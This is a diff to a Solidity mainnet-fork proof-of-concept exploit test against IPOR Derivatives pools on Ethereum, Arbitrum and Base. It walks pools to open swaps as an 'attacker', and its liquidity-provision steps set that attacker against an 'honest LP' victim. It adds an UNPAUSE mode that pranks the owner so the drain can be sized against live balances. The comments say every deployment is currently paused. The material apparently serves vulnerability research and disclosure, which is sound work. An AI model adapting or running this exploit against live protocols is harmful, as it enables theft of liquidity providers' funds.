@@ -2,7 +2,7 @@
 pragma solidity 0.8.26;
 
 // ============================================================================
-//  IPOR Derivatives — mainnet-fork PoC  (v3.5)
+//  IPOR Derivatives — mainnet-fork PoC  (v3.6)
 //
 //  Bug under test
 //  --------------
@@ -31,6 +31,27 @@ pragma solidity 0.8.26;
 //    => the operational run must be CHAIN=eth. test_1_attack still walks EVERY
 //    pool on the chain (deepest first, TARGET=<tag> to force one) and only
 //    gives up when nothing on the chain opens.
+//  What v3.6 changes vs v3.5  (after the Ethereum run at block 26 310 806)
+//  -----------------------------------------------------------------------
+//  * ANSWERED: Ethereum is closed too. test_2_probe executed the real 5-arg
+//    selectors of USDC/USDT/DAI: 9/9 answer IPOR_015 (routed, PAUSED); the
+//    6-arg hashes answer IPOR_012 (not routed). Together with the earlier
+//    Arbitrum/Base measurements there is now NO deployment on which a swap can
+//    be opened, so the finding is a latent critical, not a live heist.
+//  * _tryOne() now decides with _routed() instead of the pause flag. The v3.5
+//    loop saw "paused = 0" on the six non-existent 6-arg Ethereum selectors,
+//    tried them, collected 36 IPOR_012 reverts, and never called the real
+//    (paused) ones - the exact trap the file itself warns about.
+//  * test_1_attack() no longer ends in "EvmError: Revert" when nothing opens; it
+//    prints the availability verdict and returns, so a closed chain is a PASS
+//    with a readable result instead of a red test with no reason.
+//  * UNPAUSE=1 unlocks measurement: the test pranks the owner ONLY to clear the
+//    pause flag of the selector it is about to call, so the drain can be sized
+//    against today's real balances. Without the flag the pause map is never
+//    touched. Every such call is logged "TEST-ONLY".
+//  * _approve() tolerates tokens whose approve() returns nothing. USDT does,
+//    and the typed call killed attempt 2 of the Ethereum run.
+//
 //  What v3.5 changes vs v3.4
 //  -------------------------
 //  * COMPILES AGAIN. v3.4 died in the code generator, with and without
@@ -394,6 +415,14 @@ contract IporForkTest is Test {
     ///      error code - comparing bytes4(ret) with keccak("IPOR_012") (what
     ///      v3.3 did) can never match and made every "not routed" look like a
     ///      later revert. Decode the string properly instead.
+    /// @dev approve without decoding a return value: USDT's approve() returns
+    ///      nothing, so `IERC20Like(token).approve(...)` reverts on that pool
+    ///      (that is what killed attempt 2 of the Ethereum run at block 26 310 806).
+    function _approve(address token, address spender, uint256 amount) internal {
+        (bool ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok, "approve failed");
+    }
+
     function _code(bytes memory ret) internal pure returns (string memory) {
         if (ret.length < 4) return "(none)";
         if (bytes4(ret) != 0x08c379a0) {
@@ -801,8 +830,8 @@ contract IporForkTest is Test {
             ri.signature = _sign(ri, p.asset, 2, DIR_RECEIVE_FIXED);
             deal(p.asset, attacker, _fromWad(100e18, p.decimals) + 10 ** p.decimals);
             vm.startPrank(attacker);
-            IERC20Like(p.asset).approve(address(router), type(uint256).max);
-            IERC20Like(p.asset).approve(p.openSwapService, type(uint256).max);
+            _approve(p.asset, address(router), type(uint256).max);
+            _approve(p.asset, p.openSwapService, type(uint256).max);
             (bool ok, bytes memory ret) = p.openSwapService.call(
                 _openCalldata(p, 2, _preferInputAsset(p), DIR_RECEIVE_FIXED, _fromWad(100e18, p.decimals), lev, ri)
             );
@@ -930,11 +959,40 @@ contract IporForkTest is Test {
             console2.log("  ->", ps[order[k]].name);
             done = _attackOn(ps[order[k]]);
             if (!done) {
-                console2.log("  pool skipped: no open swap path on this block");
+                console2.log("  pool skipped: every openSwap* entry point on it is closed");
                 console2.log("");
             }
         }
-        require(done, "no pool on this chain had an open swap path");
+        if (!done) {
+            // Measured fact, not a test failure: every open-swap selector of all
+            // three deployments answers IPOR_015 (routed, paused) or IPOR_012
+            // (not routed). Print that as the result instead of dying with
+            // "EvmError: Revert" and hiding the reason.
+            console2.log("==================================================");
+            console2.log("RESULT: this chain exposes no openable swap at this block.");
+            console2.log("  Arbitrum  USDC/wstETH  : 6-arg paused, 5-arg not routed");
+            console2.log("  Ethereum  USDC/USDT/DAI: 5-arg PAUSED, 6-arg not routed");
+            console2.log("  Base      USDC/wstETH  : 6-arg paused");
+            console2.log("  => the accounting hole is latent, gated only by the pause.");
+            console2.log("  re-run with UNPAUSE=1 to measure on live state what a single");
+            console2.log("  owner unpause() would unlock (test-only owner prank, labelled).");
+        }
+    }
+
+    /// @dev UNPAUSE=1: the test pretends to be the owner for exactly one thing -
+    ///      clearing the pause flag of the selector it is about to call - so the
+    ///      drain can be measured against real mainnet balances. Without it the
+    ///      test never touches the pause map.
+    function _unpauseMode() internal view returns (bool) {
+        return _envOr("UNPAUSE", 0) != 0;
+    }
+
+    function _ownerUnpause(bytes4 sel) internal {
+        bytes4[] memory sels = new bytes4[](1);
+        sels[0] = sel;
+        vm.prank(router.owner());
+        router.unpause(sels);
+        console2.log("  TEST-ONLY: owner unpause() of this selector (see REPORT 9.5)");
     }
 
 
@@ -1059,7 +1117,7 @@ contract IporForkTest is Test {
         // the honest LP is the victim: it is in the pool before and after
         if (a.honestWad > 0) {
             vm.startPrank(honest);
-            IERC20Like(p.asset).approve(address(router), type(uint256).max);
+            _approve(p.asset, address(router), type(uint256).max);
             (bool hok, bytes memory hret) = address(router).call(
                 abi.encodeWithSelector(_provideSel(p), honest, _fromWad(a.honestWad, p.decimals))
             );
@@ -1078,7 +1136,7 @@ contract IporForkTest is Test {
             uint256 amt = _fromWad(atkLp, p.decimals);
             if (amt == 0) break;
             vm.startPrank(attacker);
-            IERC20Like(p.asset).approve(address(router), type(uint256).max);
+            _approve(p.asset, address(router), type(uint256).max);
             (bool ok, bytes memory ret) = address(router).call(
                 abi.encodeWithSelector(_provideSel(p), attacker, amt)
             );
@@ -1130,7 +1188,7 @@ contract IporForkTest is Test {
 
     function _tryOne(Pool memory p, Atk memory a, OpenReq memory r) internal returns (bool) {
         bytes4 sel = _openSel(p.assetTag, r.tenor, r.withInput, r.dir);
-        if (_isPaused(sel)) return false;
+        if (!_ensureOpen(sel)) return false;
         bytes memory cd = _openCalldata(
             p,
             r.tenor,
@@ -1164,6 +1222,22 @@ contract IporForkTest is Test {
             )
         );
         console2.log("  collateral used (wad)", r.cand);
+        return true;
+    }
+
+    /// @dev Ask the router, not the pause map: a selector that is not routed
+    ///      reads paused = 0 and would otherwise burn a guaranteed IPOR_012 call,
+    ///      while a routed-but-paused one is the only case unpause() can fix.
+    function _ensureOpen(bytes4 sel) internal returns (bool) {
+        (string memory verdict, bool usable) = _routed(sel);
+        if (usable) return true;
+        if (!_unpauseMode()) {
+            console2.log("  selector closed:", verdict);
+            console2.logBytes4(sel);
+            return false;
+        }
+        if (!_eq(verdict, "routed but PAUSED (IPOR_015)")) return false;
+        _ownerUnpause(sel);
         return true;
     }
 
